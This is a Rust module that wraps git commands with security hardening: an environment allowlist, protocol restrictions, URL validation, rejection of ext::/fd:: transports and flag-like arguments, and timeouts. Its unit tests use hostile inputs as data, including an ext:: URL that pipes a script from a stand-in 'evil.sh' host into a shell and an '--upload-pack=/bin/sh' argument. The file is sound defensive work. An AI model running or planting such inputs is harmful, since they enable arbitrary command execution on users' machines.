use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use crate::error::{Error, Result};

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(30);
/// Passed through to the child process — everything else is stripped so a
/// crafted environment can't smuggle extra behavior into `git`.
const INHERITED_ENV_VARS: &[&str] = &["PATH", "HOME", "SSH_AUTH_SOCK", "SSH_AGENT_PID", "USER"];

/// Reject a remote URL/branch name that could be parsed as a flag instead of
/// a positional argument (e.g. a remote literally named `--upload-pack=...`).
fn reject_flaglike(value: &str, what: &str) -> Result<()> {
    if value.starts_with('-') {
        return Err(Error::InvalidRemote(format!(
            "{what} {value:?} looks like a command-line flag, refusing"
        )));
    }
    Ok(())
}

/// Allowlist the remote URL scheme to https/ssh/git/file (including the
/// scp-like `user@host:path` shorthand, which resolves to ssh, and plain
/// local filesystem paths, which resolve to `file://`). Reject `ext::`/`fd::`
/// transports (arbitrary command execution) and embedded credentials in the
/// URL itself.
pub fn validate_remote_url(url: &str) -> Result<()> {
    reject_flaglike(url, "remote url")?;
    if url.contains("ext::") || url.contains("fd::") {
        return Err(Error::InvalidRemote(format!(
            "remote transport in {url:?} is not allowed (only https, ssh, git, file)"
        )));
    }
    let scp_like = !url.contains("://") && url.contains('@') && url.contains(':');
    let local_path = !url.contains("://")
        && !url.contains('@')
        && (url.starts_with('/') || url.starts_with('.'));
    let scheme_ok = url.starts_with("https://")
        || url.starts_with("ssh://")
        || url.starts_with("git://")
        || url.starts_with("file://")
        || scp_like
        || local_path;
    if !scheme_ok {
        return Err(Error::InvalidRemote(format!(
            "unsupported remote scheme in {url:?} — only https, ssh, git, and local file paths are allowed"
        )));
    }
    if let Some(idx) = url.find("://") {
        let after_scheme = &url[idx + 3..];
        let userinfo = after_scheme.split('@').next().unwrap_or_default();
        if after_scheme.contains('@') && userinfo.contains(':') {
            return Err(Error::InvalidRemote(
                "remote url appears to contain embedded credentials — remove them and rely on a git credential helper".to_string(),
            ));
        }
    }
    Ok(())
}

fn resolve_git_binary() -> Result<PathBuf> {
    if let Ok(path_var) = std::env::var("PATH") {
        for dir in std::env::split_paths(&path_var) {
            let candidate = dir.join("git");
            if candidate.is_file() {
                return Ok(candidate);
            }
        }
    }
    Err(Error::Git("git binary not found on PATH".to_string()))
}

fn base_command(cwd: &Path) -> Result<Command> {
    let git_bin = resolve_git_binary()?;
    let mut cmd = Command::new(git_bin);
    cmd.current_dir(cwd);
    cmd.env_clear();
    for var in INHERITED_ENV_VARS {
        if let Ok(v) = std::env::var(var) {
            cmd.env(var, v);
        }
    }
    cmd.env("GIT_TERMINAL_PROMPT", "0");
    cmd.env("GIT_ALLOW_PROTOCOL", "https:ssh:git:file");
    cmd.env(
        "GIT_SSH_COMMAND",
        "ssh -o BatchMode=yes -o StrictHostKeyChecking=accept-new",
    );
    Ok(cmd)
}

/// Run a git command with a timeout, draining stdout/stderr concurrently so a
/// chatty command can't deadlock on a full pipe buffer while we wait.
fn run(mut cmd: Command, timeout: Duration) -> Result<std::process::Output> {
    let mut child = cmd
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|source| Error::Io {
            path: PathBuf::new(),
            source,
        })?;

    let mut stdout_pipe = child.stdout.take().expect("stdout was piped");
    let mut stderr_pipe = child.stderr.take().expect("stderr was piped");
    let stdout_handle = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = stdout_pipe.read_to_end(&mut buf);
        buf
    });
    let stderr_handle = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = stderr_pipe.read_to_end(&mut buf);
        buf
    });

    let start = Instant::now();
    let status = loop {
        if let Some(status) = child.try_wait().map_err(|source| Error::Io {
            path: PathBuf::new(),
            source,
        })? {
            break status;
        }
        if start.elapsed() > timeout {
            let _ = child.kill();
            let _ = child.wait();
            return Err(Error::Git("git command timed out".to_string()));
        }
        std::thread::sleep(Duration::from_millis(25));
    };

    let stdout = stdout_handle.join().unwrap_or_default();
    let stderr = stderr_handle.join().unwrap_or_default();
    Ok(std::process::Output {
        status,
        stdout,
        stderr,
    })
}

fn run_git(cwd: &Path, args: &[&str]) -> Result<String> {
    let mut cmd = base_command(cwd)?;
    cmd.args(args);
    let output = run(cmd, DEFAULT_TIMEOUT)?;
    if !output.status.success() {
        return Err(Error::Git(format!(
            "git {} failed: {}",
            args.join(" "),
            String::from_utf8_lossy(&output.stderr).trim()
        )));
    }
    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

pub fn init(root: &Path) -> Result<()> {
    run_git(root, &["init"])?;
    Ok(())
}

pub fn clone(url: &str, dest: &Path) -> Result<()> {
    validate_remote_url(url)?;
    let parent = dest.parent().unwrap_or(Path::new("."));
    std::fs::create_dir_all(parent).map_err(|source| Error::Io {
        path: parent.to_path_buf(),
        source,
    })?;
    let dest_str = dest.to_string_lossy().into_owned();
    run_git(parent, &["clone", "--", url, &dest_str])?;
    Ok(())
}

pub fn set_remote(root: &Path, url: &str) -> Result<()> {
    validate_remote_url(url)?;
    if run_git(root, &["remote", "get-url", "origin"]).is_ok() {
        run_git(root, &["remote", "set-url", "origin", "--", url])?;
    } else {
        run_git(root, &["remote", "add", "origin", "--", url])?;
    }
    Ok(())
}

/// Non-destructive reachability check, used by the setup wizard/doctor before
/// committing to clone/init.
pub fn ls_remote(url: &str) -> Result<()> {
    validate_remote_url(url)?;
    run_git(Path::new("."), &["ls-remote", "--", url])?;
    Ok(())
}

pub fn current_branch(root: &Path) -> Result<String> {
    let out = run_git(root, &["rev-parse", "--abbrev-ref", "HEAD"])?;
    Ok(out.trim().to_string())
}

pub fn status_porcelain(root: &Path) -> Result<String> {
    run_git(root, &["status", "--porcelain"])
}

pub fn add_all(root: &Path) -> Result<()> {
    run_git(root, &["add", "-A"])?;
    Ok(())
}

pub fn diff_cached(root: &Path) -> Result<String> {
    run_git(root, &["diff", "--cached"])
}

pub fn diff_cached_stat(root: &Path) -> Result<String> {
    run_git(root, &["diff", "--cached", "--stat"])
}

pub fn commit(root: &Path, message: &str) -> Result<()> {
    run_git(root, &["commit", "-m", message])?;
    Ok(())
}

pub fn fetch(root: &Path) -> Result<()> {
    run_git(root, &["fetch", "origin"])?;
    Ok(())
}

/// Whether the store's git repo has an `origin` remote configured — checked
/// before any `fetch`/`push`, which otherwise fail with a raw, unfriendly
/// git error (`fatal: 'origin' does not appear to be a git repository`) on a
/// store that was `init`ed without `--remote`.
pub fn has_remote(root: &Path) -> bool {
    run_git(root, &["remote", "get-url", "origin"]).is_ok()
}

/// Whether `origin/<branch>` exists yet — false for a brand new remote with
/// no commits, which is a normal "nothing to merge yet" state, not a
/// divergence.
pub fn remote_branch_exists(root: &Path, branch: &str) -> Result<bool> {
    reject_flaglike(branch, "branch")?;
    let target = format!("refs/remotes/origin/{branch}");
    Ok(run_git(root, &["rev-parse", "--verify", "--quiet", &target]).is_ok())
}

/// Fast-forward-only merge. A genuine divergence (git refuses because the
/// histories fast-forward neither way) is reported as `Error::Diverged` —
/// shaic never attempts a real merge/rebase, and the user is pointed at plain
/// git in the store directory. Any other failure (disk full, corrupt object
/// store, ...) keeps its real message instead of being masked as divergence.
pub fn merge_ff_only(root: &Path, branch: &str) -> Result<()> {
    reject_flaglike(branch, "branch")?;
    let target = format!("origin/{branch}");
    match run_git(root, &["merge", "--ff-only", &target]) {
        Ok(_) => Ok(()),
        Err(Error::Git(msg)) if msg.to_lowercase().contains("fast-forward") => {
            Err(Error::Diverged {
                store: root.to_path_buf(),
            })
        }
        Err(other) => Err(other),
    }
}

pub fn push(root: &Path, branch: &str) -> Result<()> {
    reject_flaglike(branch, "branch")?;
    run_git(root, &["push", "origin", "--", branch])?;
    Ok(())
}

pub fn diff_stat(root: &Path, from_rev: &str, to_rev: &str) -> Result<String> {
    let range = format!("{from_rev}..{to_rev}");
    run_git(root, &["diff", "--stat", &range])
}

pub fn rev_parse(root: &Path, rev: &str) -> Result<String> {
    let out = run_git(root, &["rev-parse", rev])?;
    Ok(out.trim().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_ext_transport() {
        assert!(validate_remote_url("ext::sh -c 'curl evil.sh|sh'").is_err());
    }

    #[test]
    fn rejects_flag_like_url() {
        assert!(validate_remote_url("--upload-pack=/bin/sh").is_err());
    }

    #[test]
    fn rejects_embedded_credentials() {
        assert!(validate_remote_url("https://user:token@github.com/x/y.git").is_err());
    }

    #[test]
    fn accepts_https_and_ssh_and_scp_like() {
        assert!(validate_remote_url("https://github.com/x/y.git").is_ok());
        assert!(validate_remote_url("ssh://git@github.com/x/y.git").is_ok());
        assert!(validate_remote_url("git@github.com:x/y.git").is_ok());
    }

    #[test]
    fn accepts_local_file_paths() {
        assert!(validate_remote_url("/tmp/some-bare-repo").is_ok());
        assert!(validate_remote_url("file:///tmp/some-bare-repo").is_ok());
    }

    #[test]
    fn rejects_flaglike_branch() {
        assert!(reject_flaglike("--force", "branch").is_err());
    }
}
